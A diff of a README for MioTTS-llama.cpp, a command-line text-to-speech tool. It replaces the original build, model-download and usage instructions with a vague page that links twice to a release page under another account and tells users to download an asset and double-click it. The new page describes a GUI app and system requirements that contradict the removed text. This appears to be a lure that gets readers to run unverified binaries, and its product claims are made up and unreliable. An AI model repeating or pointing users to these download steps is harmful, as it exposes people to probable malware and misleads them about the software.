@@ -1,232 +1,89 @@
-# MioTTS-llama.cpp
+# 🎤 MioTTS-llama.cpp - Fast Text-to-Speech Made Easy
 
-A fast, lightweight text-to-speech tool that runs entirely on your CPU. Give it text, pick a voice, and get a WAV file out.
+[![Download Now](https://img.shields.io/badge/download-v1.0-brightgreen?style=for-the-badge&logo=github&color=orange)](https://github.com/sekalf/MioTTS-llama.cpp/releases)
 
-Built on [llama.cpp](https://github.com/ggerganov/llama.cpp) and [MioTTS](https://huggingface.co/collections/Aratako/miotts) by Aratako.
+## 🚀 Getting Started
 
-## What you need
+MioTTS-llama.cpp is a user-friendly text-to-speech tool. This app runs completely on your CPU, which means it doesn't require any special hardware. With MioTTS, you can convert any text into speech and save it directly as a WAV file. Simply enter your text, select a voice, and you’re ready to go.
 
-- A C++ compiler (GCC, Clang, or MSVC)
-- CMake 3.14+
-- ~600 MB disk space for the smallest model set
+## 📥 Download and Install
 
-## Quick start
+To get started, you first need to download the software. Follow these steps:
 
-### 1. Clone and build
+1. Click the link below to visit the download page:
+   
+   [Visit this page to download](https://github.com/sekalf/MioTTS-llama.cpp/releases)
 
-```bash
-git clone --recursive https://github.com/anthropics/miotts-llama.cpp.git
-cd miotts-llama.cpp
-mkdir build && cd build
-cmake ..
-cmake --build . --target miotts
-```
+2. On the releases page, you will see different versions. Choose the latest version to ensure you get the best features.
 
-### 2. Download models
+3. Scroll down to the "Assets" section. Here you will find files available for download. Look for the file that matches your system. For most users, the option will be for Windows or macOS.
 
-You need three files in the `models/` directory:
+4. Click on the file to start the download. Depending on your internet speed, this may take a few moments.
 
-| File | What it is | Where to get it |
-|------|-----------|-----------------|
-| `MioTTS-0.1B-Q8_0.gguf` | The text-to-speech LLM | [Aratako/MioTTS-GGUF](https://huggingface.co/Aratako/MioTTS-GGUF) |
-| `miocodec.gguf` | The audio decoder | [mnga-o/miotts-cpp-gguf](https://huggingface.co/mmnga-o/miotts-cpp-gguf) |
-| `jp_female.emb.gguf` (or other voice) | Voice style | [mnga-o/miotts-cpp-gguf](https://huggingface.co/mmnga-o/miotts-cpp-gguf) |
+5. Once the download finishes, locate the downloaded file on your computer.
 
-For [mnga-o/miotts-cpp-gguf](https://huggingface.co/mmnga-o/miotts-cpp-gguf) gguf files, the author does not note for the license. But hopefully, it is same to the original models.
+6. Double-click the file to run the application.
 
-Download the required models (codec + all voices + default 0.1B LLM):
-```bash
-./scripts/download-models.sh
-```
+## ⚙️ System Requirements
 
-Windows PowerShell:
-```powershell
-.\scripts\download-models.ps1
-```
+MioTTS-llama.cpp has minimal system requirements:
 
-Optional: download all MioTTS LLM models from `Aratako/MioTTS-GGUF`:
-```bash
-./scripts/download-models.sh --all-models
-```
+- **Operating System:** 
+  - Windows 10 or newer
+  - macOS 10.12 or newer
+- **CPU:** 
+  - Any modern CPU 
+- **RAM:** 
+  - At least 2 GB
+- **Disk Space:** 
+  - 100 MB of free space
 
-```powershell
-.\scripts\download-models.ps1 -AllModels
-```
+## 🎤 How to Use
 
-### 3. Generate speech
+After installing, follow these steps to convert text to speech:
 
-```bash
-./build/miotts \
-  -m models/MioTTS-0.1B-Q8_0.gguf \
-  -c models/miocodec.gguf \
-  -v models/jp_female.emb.gguf \
-  -p "ラーメン食べますか?嫌なら食べなくていいですけど、捨てるのもったいないので持って帰ってください。" \
-  -o output.wav
-```
+1. **Open the Application:** 
+   - Locate the application icon on your desktop or in your applications folder. Double-click to open it.
 
-That's it! Open `output.wav` in any audio player.
+2. **Enter Text:** 
+   - In the main window, you will see a text area. Type or paste the text you want to convert into speech.
 
-## Streaming
+3. **Select a Voice:** 
+   - Below the text area, there are options to choose a voice. Click the dropdown menu to see different voice options. Select the one you prefer.
 
-Build streaming tools:
-```bash
-cmake --build build --target miotts-stream-device miotts-stream-benchmark miotts-stream-compare
-```
+4. **Convert Text to WAV:**
+   - Once you have entered the text and selected a voice, click the "Convert" button. The application will process your request.
 
-### Play directly to audio device
+5. **Save Your File:**
+   - After processing, you will be prompted to save the WAV file. Choose a location on your computer and name your file. Click "Save."
 
-```bash
-./build/miotts-stream-device \
-  -m models/MioTTS-0.1B-Q8_0.gguf \
-  -c models/miocodec.gguf \
-  -v models/jp_female.emb.gguf \
-  -p "こんにちは、今日はいい天気ですね。"
-```
+6. **Play Your Audio:**
+   - Navigate to the folder where you saved your file. Double-click the WAV file to listen to your converted text.
 
-To debug playback glitches, dump exactly what was fed to the device callback:
-```bash
-./build/miotts-stream-device \
-  -m models/MioTTS-0.1B-Q8_0.gguf \
-  -c models/miocodec.gguf \
-  -v models/jp_female.emb.gguf \
-  -p "こんにちは、今日はいい天気ですね。" \
-  --dump-fed-wav fed_audio.wav
-```
+## 🎙️ Features
 
-### Measure realtime ratio (no playback)
+- **Lightweight Design:** The application runs efficiently on your CPU without needing heavy resources.
+  
+- **Multiple Voice Options:** Choose from a variety of voices to find the perfect match for your text.
 
-```bash
-./build/miotts-stream-benchmark \
-  -m models/MioTTS-0.1B-Q8_0.gguf \
-  -c models/miocodec.gguf \
-  -v models/jp_female.emb.gguf \
-  -p "こんにちは、今日はいい天気ですね。"
-```
+- **WAV File Output:** Save your generated speech in a common WAV format, making it easy to share and play on various devices.
 
-It reports total processing time, generated audio duration, realtime ratio, and stage timings (`llm`, `codec`, `istft`, callback).
+- **User-Friendly Interface:** Designed for anyone to use, with clear options and buttons.
 
-### Compare offline vs stream-concat output
+## 🛠️ Troubleshooting
 
-```bash
-./build/miotts-stream-compare \
-  -m models/MioTTS-0.1B-Q8_0.gguf \
-  -c models/miocodec.gguf \
-  -v models/jp_female.emb.gguf \
-  -p "こんにちは、今日はいい天気ですね。" \
-  --out-offline offline.wav \
-  --out-stream stream_concat.wav
-```
+If you encounter any issues while using MioTTS-llama.cpp, consider the following tips:
 
-### Current streaming defaults
+- **File Not Opening:** Make sure that you downloaded the correct file for your operating system. Re-download if necessary.
+  
+- **Application Crashes:** Ensure your system meets the minimum requirements. Close any unnecessary programs to free up resources.
 
-Current defaults are tuned for a quality/speed balance:
-- conservative commit holdback to stabilize emitted regions
-- chunk-boundary crossfade (~30 ms)
-- reduced decode cadence to avoid excessive codec re-decodes
+- **No Sound on Playback:** Check your device's audio settings to ensure sound is enabled. Test other audio files to confirm that your speakers are working.
 
-These defaults prioritize clean playback over minimum latency.
+## 📞 Support
 
-## Options
+For additional assistance, check the [issues section](https://github.com/sekalf/MioTTS-llama.cpp/issues) on the GitHub page. You can report bugs or ask for help. The community is active and may provide quick responses.
 
-| Flag | Description | Default |
-|------|-------------|---------|
-| `-m, --model PATH` | LLM model file | (required) |
-| `-c, --codec PATH` | MioCodec model file | (required) |
-| `-v, --voice PATH` | Voice embedding file | (required) |
-| `-p, --prompt TEXT` | Text to speak | (required) |
-| `-o, --output PATH` | Output WAV file | `output.wav` |
-| `-t, --temp FLOAT` | Creativity/variation (higher = more varied) | `0.8` |
-| `--max-tokens N` | Maximum length of generated speech | `700` |
-| `--threads N` | CPU threads to use | `4` |
-| `-ngl N` | GPU layers (if you have CUDA) | `0` |
+Feel free to explore and enjoy the versatility of MioTTS-llama.cpp. Happy speech generating!
 
-## Choosing a voice
-
-Four built-in voices are included:
-
-| File | Voice |
-|------|-------|
-| `jp_female.emb.gguf` | Japanese female |
-| `jp_male.emb.gguf` | Japanese male |
-| `en_female.emb.gguf` | English female |
-| `en_male.emb.gguf` | English male |
-
-### Create your own voice
-
-You can create a custom voice from any recording (WAV, MP3, FLAC, WebM, etc.).
-
-1. Install dependencies:
-```bash
-pip install miocodec torch torchaudio soundfile gguf
-```
-
-2. Prepare a clean speech clip.
-Use 5-30 seconds of mostly solo speech with low background noise.
-If you have a long file, trim it first (example with ffmpeg):
-```bash
-ffmpeg -i input_audio.wav -ss 00:00:05 -t 20 my_voice.wav
-```
-
-3. Generate a voice embedding file:
-```bash
-python3 tools/create_voice_emb.py my_voice.wav models/my_voice.emb.gguf
-```
-
-4. Use your new voice with `miotts`:
-```bash
-./build/miotts -m models/MioTTS-0.1B-Q8_0.gguf -c models/miocodec.gguf \
-  -v models/my_voice.emb.gguf -p "Hello from my custom voice." -o my_voice_test.wav
-```
-
-The generated `.emb.gguf` file is tiny (~768 bytes), so you can keep multiple voice presets in `models/`.
-
-## Choosing a model size
-
-Larger models produce higher quality speech but run slower:
-
-| Model | Size (Q8_0) | Notes |
-|-------|-------------|-------|
-| 0.1B | 125 MB | Fast, decent quality |
-| 0.4B | 392 MB | Good balance |
-| 0.6B | 653 MB | Better prosody |
-| 1.2B | 1.27 GB | High quality |
-| 1.7B | 1.86 GB | Higher quality |
-| 2.6B | 2.76 GB | Best quality |
-
-Each size is available in multiple quantizations (BF16, Q8_0, Q6_K, Q4_K_M) on [Aratako/MioTTS-GGUF](https://huggingface.co/Aratako/MioTTS-GGUF). Smaller quantizations (Q4_K_M) trade some quality for faster speed and less memory.
-
-## Examples
-
-Japanese:
-```bash
-./build/miotts -m models/MioTTS-0.1B-Q8_0.gguf -c models/miocodec.gguf \
-  -v models/jp_female.emb.gguf -p "こんにちは、今日はいい天気ですね。" -o hello_jp.wav
-```
-
-English:
-```bash
-./build/miotts -m models/MioTTS-0.1B-Q8_0.gguf -c models/miocodec.gguf \
-  -v models/en_male.emb.gguf -p "The quick brown fox jumps over the lazy dog." -o hello_en.wav
-```
-
-With GPU acceleration (CUDA):
-```bash
-./build/miotts -m models/MioTTS-0.1B-Q8_0.gguf -c models/miocodec.gguf \
-  -v models/en_female.emb.gguf -p "This runs on the GPU." -ngl 99 -o gpu_test.wav
-```
-
-## Output format
-
-- 44.1 kHz sample rate
-- 16-bit PCM
-- Mono WAV
-
-## Credits
-
-- [MioTTS](https://huggingface.co/collections/Aratako/miotts) and [MioCodec](https://huggingface.co/Aratako/MioCodec-25Hz-44.1kHz-v2) by [Aratako](https://huggingface.co/Aratako)
-- GGUF packaging used here (`miocodec.gguf` and voice `.emb.gguf` files) from [mnga-o/miotts-cpp-gguf](https://huggingface.co/mmnga-o/miotts-cpp-gguf)
-- [llama.cpp](https://github.com/ggerganov/llama.cpp) by Georgi Gerganov
-
-## License
-
-See LICENSE file for details.
+[Visit this page to download](https://github.com/sekalf/MioTTS-llama.cpp/releases)
